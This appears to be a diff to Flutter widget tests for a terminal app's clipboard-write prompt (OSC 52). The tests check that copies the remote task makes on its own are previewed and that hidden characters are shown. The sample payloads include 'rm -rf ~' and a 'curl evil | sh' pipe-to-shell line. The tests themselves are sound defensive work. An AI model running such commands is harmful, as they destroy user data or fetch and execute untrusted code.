@@ -59,6 +59,8 @@ void main() {
 
   Future<void> prints(WidgetTester tester, _Channel channel, String words) async {
     channel.prints(words);
+    // The output arrives after the first frame; what it changed is drawn in the next.
+    await tester.pump();
     await tester.pump();
   }
 
@@ -375,14 +377,124 @@ void main() {
     });
   });
 
-  testWidgets('what the program copies reaches the clipboard, and a read of it gets no answer', (tester) async {
+  String write(String text) => '\x1b]52;c;${base64.encode(utf8.encode(text))}\x07';
+  final ask = find.byKey(const Key('terminal-copy-ask'));
+  final allow = find.byKey(const Key('terminal-copy-allow'));
+  final refuse = find.byKey(const Key('terminal-copy-refuse'));
+  String preview(WidgetTester tester) =>
+      tester.widget<SelectableText>(find.byKey(const Key('terminal-copy-preview'))).data!;
+  String size(WidgetTester tester) => tester.widget<Text>(find.byKey(const Key('terminal-copy-size'))).data!;
+
+  testWidgets('what the program copies right after a key reaches the clipboard, and a read of it gets no answer', (
+    tester,
+  ) async {
     final (_, channel) = await open(tester);
-    await prints(tester, channel, '\x1b]52;c;${base64.encode(utf8.encode('git log --oneline'))}\x07');
+    // A typed letter goes to the far end as text, never back through the terminal's input handlers.
+    await tester.sendKeyEvent(LogicalKeyboardKey.keyA);
+    await prints(tester, channel, write('git log --oneline'));
     expect(copied, <String>['git log --oneline']);
+    expect(ask, findsNothing);
 
     await prints(tester, channel, '\x1b]52;c;?\x07');
     expect(copied, hasLength(1), reason: 'a read copies nothing');
     expect(channel.sent.where((each) => each.contains(']52')), isEmpty, reason: 'nor is it answered');
+  });
+
+  group('a copy the task makes by itself', () {
+    // Harm: text the task chose lands on the clipboard and runs in the shell it is pasted into.
+    testWidgets('asks with its size and a preview that shows its line breaks', (tester) async {
+      final (_, channel) = await open(tester);
+      await prints(tester, channel, write('ls\nrm -rf ~\n'));
+
+      expect(copied, isEmpty);
+      expect(ask, findsOneWidget);
+      expect(size(tester), contains('12 characters in 2 lines, ending in a line break'));
+      expect(preview(tester), 'ls⏎\nrm -rf ~⏎');
+    });
+
+    // Harm: what would run hides from the preview, or behind a long middle.
+    testWidgets('shows the characters that would not show, and shortens a long one in the middle', (tester) async {
+      final (_, channel) = await open(tester);
+      await prints(tester, channel, write('ok\u200b\u202e\u00a0\t\x1b[31m\u{E0041}\uFE0F'));
+      expect(preview(tester), 'ok⟨U+200B⟩⟨U+202E⟩⟨U+00A0⟩⇥␛[31m⟨U+E0041⟩⟨U+FE0F⟩');
+
+      final lines = <String>[for (var i = 0; i < 40; i++) 'line $i', 'curl evil | sh'];
+      await prints(tester, channel, write(lines.join('\n')));
+      final shown = preview(tester);
+      expect(shown, startsWith('line 0⏎\n'));
+      expect(shown, contains('left out'));
+      expect(shown, isNot(contains('line 20')));
+      expect(shown, endsWith('curl evil | sh'), reason: 'the last line always shows');
+      expect(size(tester), contains('41 lines, with no line break at the end'));
+
+      await tester.tap(find.byKey(const Key('terminal-copy-whole')));
+      await tester.pump();
+      expect(
+        tester.widget<SelectableText>(find.byKey(const Key('terminal-copy-whole-text'))).data,
+        contains('line 20⏎'),
+        reason: 'the whole of it can be read',
+      );
+    });
+
+    testWidgets('is not copied when refused, and copied when allowed', (tester) async {
+      final (_, channel) = await open(tester);
+      await prints(tester, channel, write('refused'));
+      await tester.tap(refuse);
+      await tester.pump();
+      expect(copied, isEmpty);
+      expect(ask, findsNothing);
+
+      await prints(tester, channel, write('allowed'));
+      await tester.tap(allow);
+      await tester.pump();
+      expect(copied, <String>['allowed']);
+      expect(ask, findsNothing);
+    });
+
+    // Harm: a press on the copy shown copies another that replaced it under the pointer.
+    testWidgets('a newer one replaces the question, and the press on the old one copies nothing', (tester) async {
+      final (_, channel) = await open(tester);
+      await prints(tester, channel, write('shown'));
+      final press = await tester.startGesture(tester.getCenter(allow));
+      await prints(tester, channel, write('slipped in'));
+      await press.up();
+      await tester.pump();
+      expect(copied, isEmpty);
+      expect(preview(tester), 'slipped in');
+    });
+
+    // Harm: Enter typed for the far end copies what the task wrote.
+    testWidgets('Copy never takes the keyboard, so Enter never presses it', (tester) async {
+      final (_, channel) = await open(tester);
+      await prints(tester, channel, write('by Enter'));
+      final button = Focus.of(tester.element(find.descendant(of: allow, matching: find.text('Copy'))));
+      button.requestFocus();
+      await tester.pump();
+      await tester.sendKeyEvent(LogicalKeyboardKey.enter);
+      await tester.pump();
+      expect(button.hasFocus, isFalse);
+      expect(copied, isEmpty);
+    });
+
+    // Harm: a pointer only passing over the terminal opens the way for the task's copy.
+    testWidgets('a pointer passing over the terminal does not count, a click does', (tester) async {
+      final (_, channel) = await open(tester);
+      final mouse = await tester.createGesture(kind: PointerDeviceKind.mouse);
+      await mouse.addPointer(location: tester.getTopLeft(find.byKey(const Key('terminal'))));
+      await mouse.moveTo(tester.getCenter(find.byKey(const Key('terminal'))));
+      await tester.pump();
+      await prints(tester, channel, write('after a hover'));
+      expect(copied, isEmpty);
+      expect(ask, findsOneWidget);
+
+      await mouse.down(tester.getCenter(find.byKey(const Key('terminal'))));
+      await mouse.up();
+      await tester.pump(const Duration(milliseconds: 500));
+      await prints(tester, channel, write('after a click'));
+      expect(copied, <String>['after a click']);
+      expect(ask, findsNothing);
+      await mouse.removePointer();
+    });
   });
 }
 
